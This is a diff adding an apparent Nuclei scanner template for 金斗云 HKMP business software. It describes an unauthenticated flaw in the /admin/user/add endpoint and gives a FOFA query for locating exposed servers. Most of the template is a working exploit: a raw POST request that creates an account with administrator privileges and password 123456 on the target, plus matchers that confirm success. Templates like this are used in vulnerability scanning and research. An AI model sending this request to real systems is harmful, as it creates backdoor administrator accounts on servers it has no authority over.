@@ -1,0 +1,41 @@
+id: jindouyun-HKMP-User-addition
+
+info:
+  name: "金斗云 HKMP智慧商业软件 接口任意创建用户漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="金斗云 Copyright"
+    金斗云 HKMP智慧商业软件的 /admin/user/add 接口存在用户账户任意创建漏洞。攻击者可利用该接口在未进行身份验证的情况下创建管理员账户，进而获得系统后台控制权限，导致敏感信息泄露及系统安全状态严重受损。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140161975
+  tags: 金斗云
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+
+http:
+- raw:
+  - |
+    POST /admin/user/add HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json;charset=UTF-8
+
+    {"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"{{username}}","userName":"{{username}}","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '用户添加成功'
+    - '用户名已存在'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
